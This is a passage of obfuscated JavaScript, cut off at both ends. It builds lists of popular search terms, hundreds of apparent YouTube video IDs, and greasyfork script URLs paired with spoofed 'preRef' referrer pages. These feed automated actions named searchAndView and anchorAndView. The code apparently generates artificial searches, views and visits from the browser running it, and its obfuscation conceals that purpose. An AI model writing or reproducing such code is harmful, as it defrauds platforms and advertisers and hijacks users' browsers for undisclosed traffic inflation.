    return !l ? (b['nzYCWw'] === undefined && (b['nzYCWw'] = !![]), h = b['YzmPLy'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1808 + -0xcc0 * -0x1 + 0xb52 * 0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x930 + 0x229c + -0x6 * 0x74b)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1 * -0x12cb + 0x1ae7 + 0x1 * -0x819);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    V(0x7) + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    W(0x12) + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    W(0xd) + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    V(0x9) + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    W(0x2) + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    W(0x1b) + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    X(0xa, ')Hli') + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    W(0x1f) + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    W(0x13) + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + X(0x17, '%6gg') + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + V(0x4) + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + V(0x3) + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + V(0xb),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + X(0x18, 'wDA5') + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
